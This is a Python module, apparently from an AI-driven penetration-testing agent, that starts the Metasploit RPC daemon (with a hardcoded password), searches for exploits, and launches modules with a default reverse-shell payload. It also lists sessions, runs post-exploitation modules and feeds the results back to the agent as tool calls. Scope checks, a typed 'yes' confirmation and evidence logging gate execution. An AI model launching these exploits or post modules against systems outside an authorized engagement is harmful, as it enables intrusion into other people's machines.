import re
import shutil
import socket
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from rich.console import Console
from agent.core.subprocess_utils import run_tool, tool_exists, get_env

console = Console()

MSF_PORT     = 55553
MSF_PASSWORD = "clawstrike"

_MSFRPCD_PATHS = [
    "/usr/share/metasploit-framework/msfrpcd",
    "/opt/metasploit-framework/bin/msfrpcd",
    "/usr/bin/msfrpcd",
]


@dataclass
class ExploitMatch:
    fullname: str
    name: str
    rank: str
    description: str


@dataclass
class ExploitResult:
    exploit: str
    target: str
    job_id: Optional[str]
    output: str
    error: Optional[str] = None


@dataclass
class Session:
    id: str
    type: str
    tunnel: str
    info: str


@dataclass
class PostResult:
    session_id: str
    module: str
    output: str
    error: Optional[str] = None


# ─── helpers ──────────────────────────────────────────────────────────────────

def _is_msfrpcd_up() -> bool:
    sock = socket.socket()
    sock.settimeout(1)
    try:
        sock.connect(("localhost", MSF_PORT))
        return True
    except OSError:
        return False
    finally:
        sock.close()


def _resolve_msfrpcd() -> Optional[str]:
    found = shutil.which("msfrpcd")
    if found:
        return found
    for path in _MSFRPCD_PATHS:
        if Path(path).is_file():
            return path
    return None


def _get_client():
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
        return MsfRpcClient(MSF_PASSWORD, port=MSF_PORT, ssl=False)
    except ImportError:
        raise ImportError(
            "pymetasploit3 not installed — run:\n"
            "  pip install pymetasploit3"
        )


# ─── start_msfrpcd ────────────────────────────────────────────────────────────

def start_msfrpcd() -> Optional[str]:
    """
    Start the Metasploit RPC daemon if not already running.
    Returns None on success, error string on failure.
    """
    if _is_msfrpcd_up():
        return None

    binary = _resolve_msfrpcd()
    if binary is None:
        tried = "\n".join(f"  {p}" for p in _MSFRPCD_PATHS)
        return (
            "msfrpcd not found. Tried:\n"
            f"{tried}\n"
            "  msfrpcd on PATH\n\n"
            "Install Metasploit Framework:\n"
            "  Linux : sudo apt install metasploit-framework\n"
            "  Manual: https://docs.metasploit.com/docs/using-metasploit/"
            "getting-started/nightly-installers.html\n\n"
            "Or start msfrpcd manually before running ClawStrike:\n"
            f"  msfrpcd -P {MSF_PASSWORD} -p {MSF_PORT} -S"
        )

    try:
        subprocess.Popen(
            [binary, "-P", MSF_PASSWORD, "-p", str(MSF_PORT), "-S"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=get_env(),
        )
        console.print(f"[dim]msfrpcd starting on port {MSF_PORT}…[/dim]")

        for _ in range(30):
            time.sleep(2)
            if _is_msfrpcd_up():
                console.print("[dim green]msfrpcd ready[/dim green]")
                return None

        return f"msfrpcd started but did not respond within 60 seconds"

    except Exception as e:
        return f"Failed to start msfrpcd: {e}"


# ─── search_exploit ───────────────────────────────────────────────────────────

_RANK_ORDER = ["excellent", "great", "good", "normal", "average", "low", "manual"]


def _rank_key(match: ExploitMatch) -> int:
    try:
        return _RANK_ORDER.index(match.rank.lower())
    except ValueError:
        return 99


def _build_query(cve: Optional[str], service: Optional[str], version: Optional[str]) -> str:
    parts = []
    if cve:
        # "CVE-2017-0144" → "2017-0144" for msf search
        parts.append(cve.upper().replace("CVE-", ""))
    if service:
        parts.append(service.lower())
    if version:
        parts.append(version.lower())
    return " ".join(parts)


def _searchsploit_fallback(query: str) -> list[ExploitMatch]:
    """Run searchsploit when pymetasploit3 is unavailable."""
    if not tool_exists("searchsploit"):
        return []
    stdout, _, _ = run_tool(["searchsploit", "--colour", query], timeout=30)
    matches = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("-") or line.startswith("Exploit Title"):
            continue
        if "|" in line:
            title, path = line.split("|", 1)
            matches.append(ExploitMatch(
                fullname=path.strip(),
                name=title.strip(),
                rank="unknown",
                description=f"searchsploit result — path: {path.strip()}",
            ))
    return matches


# msfconsole output line pattern: "   N  exploit/path/name   date  rank  check  desc"
_MSF_MODULE_RE = re.compile(r"^\s+\d+\s+(exploit/\S+|auxiliary/\S+|post/\S+)\s+.*?(\w+)\s+\w+\s+(.*)")


def _msfconsole_search_fallback(query: str) -> list[ExploitMatch]:
    """
    Run msfconsole -q -x 'search <query>; exit -y' as last-resort fallback.
    msfconsole takes 20-30s to start so we allow 60s timeout.
    """
    if not tool_exists("msfconsole"):
        return []

    console.print("[dim yellow]trying msfconsole search (may take 20-30s)…[/dim yellow]")
    stdout, stderr, rc = run_tool(
        ["msfconsole", "-q", "-x", f"search {query}; exit -y"],
        timeout=60,
    )

    matches = []
    for line in stdout.splitlines():
        m = _MSF_MODULE_RE.match(line)
        if not m:
            continue
        fullname = m.group(1)
        rank     = m.group(2)
        desc     = m.group(3).strip()
        matches.append(ExploitMatch(
            fullname=fullname,
            name=fullname.split("/")[-1],
            rank=rank,
            description=desc,
        ))

    return matches


def search_exploit(
    cve: Optional[str] = None,
    service: Optional[str] = None,
    version: Optional[str] = None,
) -> tuple[list[ExploitMatch], Optional[str]]:
    """
    Search Metasploit for exploits matching cve/service/version.
    Returns (matches, error). Falls back to searchsploit if pymetasploit3
    is unavailable.
    """
    query = _build_query(cve, service, version)
    if not query:
        return [], "search_exploit requires at least one of: cve, service, version"

    err = start_msfrpcd()
    if err:
        console.print(f"[dim yellow]msfrpcd unavailable — trying searchsploit[/dim yellow]")
        matches = _searchsploit_fallback(query)
        if matches:
            return matches, None
        console.print("[dim yellow]searchsploit not found — trying msfconsole[/dim yellow]")
        matches = _msfconsole_search_fallback(query)
        if matches:
            return matches, None
        return [], f"All search methods failed.\nmsfrpcd error: {err}"

    try:
        client = _get_client()
        console.print(f"[dim]msf search: {query}[/dim]")
        raw = client.modules.search(query)

        matches = []
        for m in raw:
            if not str(m.get("type", "")).startswith("exploit"):
                continue
            matches.append(ExploitMatch(
                fullname=m.get("fullname", m.get("name", "")),
                name=m.get("name", ""),
                rank=m.get("rank", "unknown"),
                description=m.get("description", ""),
            ))

        matches.sort(key=_rank_key)
        return matches, None

    except ImportError as e:
        console.print(f"[dim yellow]{e} — trying searchsploit[/dim yellow]")
        matches = _searchsploit_fallback(query)
        if matches:
            return matches, None
        console.print("[dim yellow]searchsploit not found — trying msfconsole[/dim yellow]")
        matches = _msfconsole_search_fallback(query)
        return matches, None if matches else str(e)

    except Exception as e:
        return [], f"Metasploit search failed: {e}"


# ─── run_exploit ──────────────────────────────────────────────────────────────

_DEFAULT_PAYLOAD = "generic/shell_reverse_tcp"
_DEFAULT_LPORT   = 4444


def run_exploit(
    exploit_path: str,
    target: str,
    lhost: str,
    options: dict = None,
    scope_check=None,
) -> ExploitResult:
    """
    Execute a Metasploit exploit module against target.

    scope_check: optional callable(target) -> (bool, str) — passed in from
                 loop.py so the ScopeManager can validate the target.
    Requires the user to type the exact word "yes" before anything executes.
    Every attempt is logged to evidence before and after execution.
    """
    if options is None:
        options = {}

    # 1. Scope check
    if scope_check is not None:
        in_scope, reason = scope_check(target)
        if not in_scope:
            return ExploitResult(
                exploit=exploit_path,
                target=target,
                job_id=None,
                output="",
                error=f"SCOPE VIOLATION: {reason}",
            )

    payload   = options.pop("payload", _DEFAULT_PAYLOAD)
    lport     = int(options.pop("lport", _DEFAULT_LPORT))
    opt_lines = "\n".join(f"  {k}: {v}" for k, v in options.items()) or "  (none)"

    # 2. Print exactly what will run
    console.print(f"\n[bold red]⚠  METASPLOIT EXPLOIT[/bold red]")
    console.print(f"  [bold]Module :[/bold] {exploit_path}")
    console.print(f"  [bold]Target :[/bold] {target}")
    console.print(f"  [bold]LHOST  :[/bold] {lhost}:{lport}")
    console.print(f"  [bold]Payload:[/bold] {payload}")
    console.print(f"  [bold]Options:[/bold]\n{opt_lines}")
    console.print(
        f"\n  [dim]Manual equivalent:[/dim]\n"
        f'  [dim]msfconsole -x "use {exploit_path}; set RHOSTS {target}; '
        f'set LHOST {lhost}; set LPORT {lport}; set payload {payload}; run"[/dim]'
    )

    # 3. Explicit confirmation — only exact "yes" proceeds
    try:
        confirm = console.input(
            '\n[bold yellow]Type "yes" to execute (anything else cancels): [/bold yellow]'
        ).strip()
    except (EOFError, KeyboardInterrupt):
        return ExploitResult(
            exploit=exploit_path, target=target, job_id=None,
            output="", error="Cancelled by user.",
        )

    if confirm != "yes":
        return ExploitResult(
            exploit=exploit_path, target=target, job_id=None,
            output="", error="Cancelled — user did not type 'yes'.",
        )

    # 4. Log intent to evidence before executing
    from agent.core import evidence as _evidence
    pre_log = (
        f"EXPLOIT ATTEMPT\n"
        f"Module : {exploit_path}\n"
        f"Target : {target}\n"
        f"LHOST  : {lhost}:{lport}\n"
        f"Payload: {payload}\n"
        f"Options: {options}\n"
    )
    _evidence.save_terminal_output(pre_log, "msf_exploit_attempt", target)

    # 5. Execute
    err = start_msfrpcd()
    if err:
        # Offer manual msfconsole command as fallback
        manual_cmd = (
            f'msfconsole -x "use {exploit_path}; set RHOSTS {target}; '
            f'set LHOST {lhost}; set LPORT {lport}; set payload {payload}; run"'
        )
        result = ExploitResult(
            exploit=exploit_path, target=target, job_id=None,
            output="",
            error=(
                f"msfrpcd unavailable: {err}\n\n"
                f"Run manually:\n  {manual_cmd}"
            ),
        )
        _evidence.save_terminal_output(
            f"msfrpcd failed — manual command:\n{manual_cmd}",
            "msf_exploit_fallback", target,
        )
        return result

    try:
        client = _get_client()

        exploit_mod = client.modules.use("exploit", exploit_path)
        exploit_mod["RHOSTS"] = target
        for k, v in options.items():
            exploit_mod[k] = v

        payload_mod = client.modules.use("payload", payload)
        payload_mod["LHOST"] = lhost
        payload_mod["LPORT"] = lport

        console.print(f"\n[bold yellow]⚡ executing:[/bold yellow] {exploit_path} → {target}")
        raw = exploit_mod.execute(payload=payload_mod)

        job_id = str(raw.get("job_id", "")) if isinstance(raw, dict) else ""
        output = f"job_id: {job_id}\nuuid: {raw.get('uuid', '') if isinstance(raw, dict) else ''}"

        result = ExploitResult(
            exploit=exploit_path, target=target,
            job_id=job_id, output=output,
        )

    except ImportError as e:
        manual_cmd = (
            f'msfconsole -x "use {exploit_path}; set RHOSTS {target}; '
            f'set LHOST {lhost}; set LPORT {lport}; set payload {payload}; run"'
        )
        result = ExploitResult(
            exploit=exploit_path, target=target, job_id=None,
            output="",
            error=f"{e}\n\nRun manually:\n  {manual_cmd}",
        )

    except Exception as e:
        result = ExploitResult(
            exploit=exploit_path, target=target, job_id=None,
            output="", error=f"Exploit execution failed: {e}",
        )

    # 6. Log result to evidence
    post_log = (
        f"EXPLOIT RESULT\n"
        f"Module : {exploit_path}\n"
        f"Target : {target}\n"
        f"Job ID : {result.job_id}\n"
        f"Error  : {result.error or 'none'}\n"
        f"Output :\n{result.output}"
    )
    _evidence.save_terminal_output(post_log, "msf_exploit_result", target)

    return result


# ─── get_sessions ─────────────────────────────────────────────────────────────

def get_sessions() -> tuple[list[Session], Optional[str]]:
    """
    Return all active Metasploit sessions (meterpreter / shell).
    Returns (sessions, error).
    """
    err = start_msfrpcd()
    if err:
        return [], (
            f"msfrpcd unavailable: {err}\n\n"
            "Check sessions manually:\n"
            "  msfconsole -x 'sessions -l'"
        )

    try:
        client = _get_client()
        raw = client.sessions.list  # dict: {session_id: {...}}

        sessions = []
        for sid, info in raw.items():
            sessions.append(Session(
                id=str(sid),
                type=info.get("type", "unknown"),
                tunnel=info.get("tunnel_local", "") + " → " + info.get("tunnel_peer", ""),
                info=info.get("info", ""),
            ))

        return sessions, None

    except ImportError as e:
        return [], (
            f"{e}\n\n"
            "Check sessions manually:\n"
            "  msfconsole -x 'sessions -l'"
        )

    except Exception as e:
        return [], f"get_sessions failed: {e}"


# ─── run_post ─────────────────────────────────────────────────────────────────

_POST_TIMEOUT = 60


def run_post(session_id: str, module: str) -> PostResult:
    """
    Run a post-exploitation module on an active session.
    Verifies the session exists first, logs full output to evidence.
    """
    # Verify session exists
    sessions, err = get_sessions()
    if err:
        return PostResult(
            session_id=session_id, module=module,
            output="", error=f"Could not retrieve sessions: {err}",
        )

    session_ids = {s.id for s in sessions}
    if str(session_id) not in session_ids:
        active = ", ".join(session_ids) if session_ids else "none"
        return PostResult(
            session_id=session_id, module=module, output="",
            error=f"Session '{session_id}' not found. Active sessions: {active}",
        )

    matched = next(s for s in sessions if s.id == str(session_id))

    # Print what will run
    console.print(f"\n[bold yellow]⚡ POST MODULE[/bold yellow]")
    console.print(f"  [bold]Session :[/bold] {session_id}  ({matched.type} — {matched.tunnel})")
    console.print(f"  [bold]Module  :[/bold] {module}")

    try:
        client = _get_client()
        session = client.sessions.session(str(session_id))
        output  = session.run_with_output(module, {"SESSION": str(session_id)}, timeout=_POST_TIMEOUT)
        output  = output if isinstance(output, str) else str(output)

        result = PostResult(session_id=session_id, module=module, output=output)

    except ImportError as e:
        manual = (
            f"msfconsole -x 'sessions -i {session_id}; "
            f"run {module} SESSION={session_id}'"
        )
        result = PostResult(
            session_id=session_id, module=module, output="",
            error=f"{e}\n\nRun manually:\n  {manual}",
        )

    except Exception as e:
        result = PostResult(
            session_id=session_id, module=module, output="",
            error=f"run_post failed: {e}",
        )

    # Log to evidence — derive target from tunnel peer IP
    target = matched.tunnel.split("→")[-1].strip().split(":")[0] or session_id
    from agent.core import evidence as _evidence
    log = (
        f"POST MODULE\n"
        f"Session: {session_id}  ({matched.type} — {matched.tunnel})\n"
        f"Module : {module}\n"
        f"Error  : {result.error or 'none'}\n"
        f"Output :\n{result.output}"
    )
    _evidence.save_terminal_output(log, f"msf_post_{module.replace('/', '-')}", target)

    return result


# ─── format_for_agent ─────────────────────────────────────────────────────────

_MAX_EXPLOITS  = 10
_MAX_OUTPUT    = 2000


def format_for_agent(results) -> str:
    # list[ExploitMatch]
    if isinstance(results, list) and (not results or isinstance(results[0], ExploitMatch)):
        if not results:
            return "Metasploit search returned no matching exploit modules."
        shown    = results[:_MAX_EXPLOITS]
        omitted  = len(results) - len(shown)
        lines    = [f"Found {len(results)} exploit module(s):\n"]
        cur_rank = None
        for m in shown:
            rank = m.rank.upper()
            if rank != cur_rank:
                lines.append(f"[{rank}]")
                cur_rank = rank
            lines.append(f"  {m.fullname}")
            if m.description:
                lines.append(f"    {m.description[:100].strip()}")
        if omitted:
            lines.append(f"\n  … and {omitted} more (refine your search to narrow results)")
        lines.append(
            "\nTo run one of these:\n"
            "  TOOL_CALL: msf_exploit <module_path> <target> <lhost>"
        )
        return "\n".join(lines)

    # ExploitResult
    if isinstance(results, ExploitResult):
        r = results
        if r.error and not r.job_id:
            return f"METASPLOIT ERROR: {r.error}"
        lines = [f"Exploit launched: {r.exploit} → {r.target}"]
        if r.job_id:
            lines.append(f"  Job ID : {r.job_id}")
            lines.append("  Use TOOL_CALL: msf_sessions to check if a session opened.")
        if r.error:
            lines.append(f"  Warning: {r.error}")
        return "\n".join(lines)

    # list[Session]
    if isinstance(results, list) and (not results or isinstance(results[0], Session)):
        if not results:
            return "No active Metasploit sessions."
        lines = [f"Active sessions ({len(results)}):\n"]
        for s in results:
            lines.append(f"  [{s.id}]  {s.type:12}  {s.tunnel}")
            if s.info:
                lines.append(f"           {s.info}")
        lines.append(
            "\nTo run a post module:\n"
            "  TOOL_CALL: msf_post <session_id> <module_path>"
        )
        return "\n".join(lines)

    # PostResult
    if isinstance(results, PostResult):
        r = results
        if r.error:
            return f"POST MODULE ERROR ({r.module}): {r.error}"
        output = r.output[:_MAX_OUTPUT]
        truncated = len(r.output) > _MAX_OUTPUT
        lines = [
            f"Post module complete: {r.module}  (session {r.session_id})",
            f"\n{output}",
        ]
        if truncated:
            lines.append(f"\n[… output truncated — {len(r.output) - _MAX_OUTPUT} chars omitted]")
        return "\n".join(lines)

    return f"format_for_agent: unrecognised result type {type(results)}"
